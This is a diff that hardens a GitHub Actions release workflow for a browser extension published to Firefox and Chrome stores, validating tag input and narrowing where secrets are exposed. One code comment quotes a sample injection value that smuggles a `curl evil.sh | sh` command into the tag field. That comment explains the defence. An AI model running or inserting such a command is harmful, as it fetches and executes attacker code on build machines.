@@ -6,27 +6,19 @@ on:
   workflow_dispatch:
     inputs:
       tag:
-        description: 'Tag to build, e.g. v1.0.0. Empty builds the default branch.'
+        description: 'Tag to build and publish, e.g. v1.0.0. Empty builds this ref without publishing.'
         type: string
         required: false
       publish:
-        description: Upload to the stores (needs the store secrets)
+        description: Upload to the stores (requires a v* tag and the store secrets)
         type: boolean
         default: false
 
 permissions:
   contents: write
 
-# Hoisted to workflow level on purpose: a step's own `env:` block is not in
-# scope when that step's `if:` is evaluated, so gating a publish step on a
-# secret defined beside it silently skips the step forever.
+# Not a secret, and needed by the AMO version check.
 env:
-  AMO_JWT_ISSUER: ${{ secrets.AMO_JWT_ISSUER }}
-  AMO_JWT_SECRET: ${{ secrets.AMO_JWT_SECRET }}
-  CHROME_CLIENT_ID: ${{ secrets.CHROME_CLIENT_ID }}
-  CHROME_CLIENT_SECRET: ${{ secrets.CHROME_CLIENT_SECRET }}
-  CHROME_REFRESH_TOKEN: ${{ secrets.CHROME_REFRESH_TOKEN }}
-  CHROME_EXTENSION_ID: ${{ secrets.CHROME_EXTENSION_ID }}
   AMO_SLUG: privacy-for-bale-web
 
 jobs:
@@ -34,9 +26,39 @@ jobs:
     name: Build and publish packages
     runs-on: ubuntu-latest
     steps:
+      # Resolved and validated before anything else, because on a manual run the
+      # input decides which code gets signed and shipped to the stores. Inputs
+      # reach the shell through env rather than ${{ }} interpolation, so a value
+      # like `v1.0.0"; curl evil.sh | sh; "` is data, never script.
+      - name: Resolve and validate the ref
+        id: ref
+        env:
+          INPUT_TAG: ${{ inputs.tag }}
+          EVENT: ${{ github.event_name }}
+          REF: ${{ github.ref }}
+          REF_NAME: ${{ github.ref_name }}
+        run: |
+          set -euo pipefail
+          if [ -n "${INPUT_TAG:-}" ]; then
+            if ! printf '%s' "$INPUT_TAG" | grep -Eq '^v[0-9]+\.[0-9]+\.[0-9]+(-[0-9A-Za-z.]+)?$'; then
+              echo "::error::tag input must look like v1.2.3, got '$INPUT_TAG'"
+              exit 1
+            fi
+            checkout="$INPUT_TAG"
+            tag="$INPUT_TAG"
+          elif [ "$EVENT" = "push" ]; then
+            checkout="$REF"
+            tag="$REF_NAME"
+          else
+            checkout="$REF"
+            tag=""
+          fi
+          printf 'checkout=%s\n' "$checkout" >> "$GITHUB_OUTPUT"
+          printf 'tag=%s\n' "$tag" >> "$GITHUB_OUTPUT"
+
       - uses: actions/checkout@v7
         with:
-          ref: ${{ inputs.tag || github.ref }}
+          ref: ${{ steps.ref.outputs.checkout }}
 
       - uses: actions/setup-node@v7
         with:
@@ -48,30 +70,49 @@ jobs:
       - name: Verify
         run: npm run verify
 
+      # Reports only whether the credentials exist. A step's own env is not in
+      # scope for its own `if:`, so the publish steps below gate on these
+      # outputs instead — which keeps the secrets out of `npm ci` and the build,
+      # where a compromised dependency could read them.
+      - name: Detect store credentials
+        id: creds
+        env:
+          AMO_ISSUER: ${{ secrets.AMO_JWT_ISSUER }}
+          CHROME_ID: ${{ secrets.CHROME_CLIENT_ID }}
+        run: |
+          set -euo pipefail
+          if [ -n "${AMO_ISSUER:-}" ]; then echo 'amo=true' >> "$GITHUB_OUTPUT"; else echo 'amo=false' >> "$GITHUB_OUTPUT"; fi
+          if [ -n "${CHROME_ID:-}" ]; then echo 'chrome=true' >> "$GITHUB_OUTPUT"; else echo 'chrome=false' >> "$GITHUB_OUTPUT"; fi
+
       - name: Read the version and decide what to publish
         id: plan
+        env:
+          TAG: ${{ steps.ref.outputs.tag }}
+          EVENT: ${{ github.event_name }}
+          WANT_PUBLISH: ${{ inputs.publish }}
         run: |
+          set -euo pipefail
           version="$(node -p "require('./package.json').version")"
-          echo "version=$version" >> "$GITHUB_OUTPUT"
+          printf 'version=%s\n' "$version" >> "$GITHUB_OUTPUT"
 
-          # A tag push always publishes; a manual run only when asked.
-          if [ "${{ github.event_name }}" = "push" ] || [ "${{ inputs.publish }}" = "true" ]; then
-            echo "publish=true" >> "$GITHUB_OUTPUT"
-          else
-            echo "publish=false" >> "$GITHUB_OUTPUT"
+          # A tag in the version has to match the manifest, or users end up with
+          # a package whose version disagrees with the release it came from.
+          if [ -n "${TAG:-}" ] && [ "${TAG#v}" != "$version" ]; then
+            echo "::error::Tag $TAG does not match package.json version $version"
+            exit 1
           fi
 
-          # The version in a tag has to match the manifest, or users end up with
-          # a package whose version disagrees with the release it came from.
-          ref="${{ inputs.tag || github.ref_name }}"
-          case "$ref" in
-            v*)
-              if [ "${ref#v}" != "$version" ]; then
-                echo "::error::Tag $ref does not match package.json version $version"
-                exit 1
-              fi
-              ;;
-          esac
+          # Only a tag is ever published: a tag push always, a manual run when
+          # asked. Building an arbitrary branch stays possible, shipping one does
+          # not.
+          publish=false
+          if [ -n "${TAG:-}" ]; then
+            if [ "$EVENT" = "push" ] || [ "${WANT_PUBLISH:-}" = "true" ]; then
+              publish=true
+            fi
+          fi
+          printf 'publish=%s\n' "$publish" >> "$GITHUB_OUTPUT"
+          echo "ref=${TAG:-(untagged)} version=$version publish=$publish"
 
       - name: Package
         run: npm run package
@@ -94,27 +135,34 @@ jobs:
           generate_release_notes: true
 
       # ---------------------------------------------------------------------
-      # Stores. Each step is skipped when its secrets are absent, so the
+      # Stores. Each step is skipped when its credentials are absent, so the
       # workflow stays green in a fork and before a store is set up.
       # ---------------------------------------------------------------------
 
       - name: Check what addons.mozilla.org already has
         id: amo
-        if: steps.plan.outputs.publish == 'true' && env.AMO_JWT_ISSUER != ''
+        if: steps.plan.outputs.publish == 'true' && steps.creds.outputs.amo == 'true'
+        env:
+          VERSION: ${{ steps.plan.outputs.version }}
         run: |
+          set -euo pipefail
           live="$(curl -fsSL "https://addons.mozilla.org/api/v5/addons/addon/$AMO_SLUG/" \
             | python3 -c 'import json,sys; print((json.load(sys.stdin).get("current_version") or {}).get("version",""))' || true)"
           echo "live version on AMO: ${live:-unknown}"
-          if [ "$live" = "${{ steps.plan.outputs.version }}" ]; then
-            echo "needed=false" >> "$GITHUB_OUTPUT"
-            echo "::notice::AMO already has ${{ steps.plan.outputs.version }}, skipping upload"
+          if [ "$live" = "$VERSION" ]; then
+            echo 'needed=false' >> "$GITHUB_OUTPUT"
+            echo "::notice::AMO already has $VERSION, skipping upload"
           else
-            echo "needed=true" >> "$GITHUB_OUTPUT"
+            echo 'needed=true' >> "$GITHUB_OUTPUT"
           fi
 
       - name: Publish to addons.mozilla.org
         if: steps.amo.outputs.needed == 'true'
+        env:
+          AMO_JWT_ISSUER: ${{ secrets.AMO_JWT_ISSUER }}
+          AMO_JWT_SECRET: ${{ secrets.AMO_JWT_SECRET }}
         run: |
+          set -euo pipefail
           # --upload-source-code is required because the shipped bundles are
           # minified by esbuild; reviewers need the readable sources.
           # --approval-timeout 0 returns as soon as the upload is accepted
@@ -129,10 +177,17 @@ jobs:
             --api-secret "$AMO_JWT_SECRET"
 
       - name: Publish to the Chrome Web Store
-        if: steps.plan.outputs.publish == 'true' && env.CHROME_CLIENT_ID != ''
+        if: steps.plan.outputs.publish == 'true' && steps.creds.outputs.chrome == 'true'
+        env:
+          VERSION: ${{ steps.plan.outputs.version }}
+          CHROME_CLIENT_ID: ${{ secrets.CHROME_CLIENT_ID }}
+          CHROME_CLIENT_SECRET: ${{ secrets.CHROME_CLIENT_SECRET }}
+          CHROME_REFRESH_TOKEN: ${{ secrets.CHROME_REFRESH_TOKEN }}
+          CHROME_EXTENSION_ID: ${{ secrets.CHROME_EXTENSION_ID }}
         run: |
+          set -euo pipefail
           npx --yes chrome-webstore-upload-cli@3 upload \
-            --source "release/bale-privacy-${{ steps.plan.outputs.version }}-chrome.zip" \
+            --source "release/bale-privacy-$VERSION-chrome.zip" \
             --extension-id "$CHROME_EXTENSION_ID" \
             --client-id "$CHROME_CLIENT_ID" \
             --client-secret "$CHROME_CLIENT_SECRET" \
@@ -141,13 +196,21 @@ jobs:
 
       - name: Summary
         if: always()
+        env:
+          VERSION: ${{ steps.plan.outputs.version }}
+          TAG: ${{ steps.ref.outputs.tag }}
+          RELEASED: ${{ startsWith(github.ref, 'refs/tags/v') }}
+          AMO_DONE: ${{ steps.amo.outputs.needed }}
+          CHROME_READY: ${{ steps.creds.outputs.chrome }}
+          PUBLISH: ${{ steps.plan.outputs.publish }}
         run: |
+          set -euo pipefail
           {
-            echo "### Release ${{ steps.plan.outputs.version }}"
+            echo "### Release ${VERSION:-unknown} (${TAG:-untagged})"
             echo
             echo "| Target | Result |"
             echo "| --- | --- |"
-            echo "| GitHub release | ${{ startsWith(github.ref, 'refs/tags/v') && 'created' || 'skipped (not a tag)' }} |"
-            echo "| addons.mozilla.org | ${{ steps.amo.outputs.needed == 'true' && 'uploaded' || 'skipped' }} |"
-            echo "| Chrome Web Store | ${{ env.CHROME_CLIENT_ID != '' && 'uploaded' || 'skipped (no secrets)' }} |"
+            echo "| GitHub release | $([ "$RELEASED" = 'true' ] && echo created || echo 'skipped (not a tag push)') |"
+            echo "| addons.mozilla.org | $([ "$AMO_DONE" = 'true' ] && echo uploaded || echo skipped) |"
+            echo "| Chrome Web Store | $([ "$PUBLISH" = 'true' ] && [ "$CHROME_READY" = 'true' ] && echo uploaded || echo 'skipped') |"
           } >> "$GITHUB_STEP_SUMMARY"
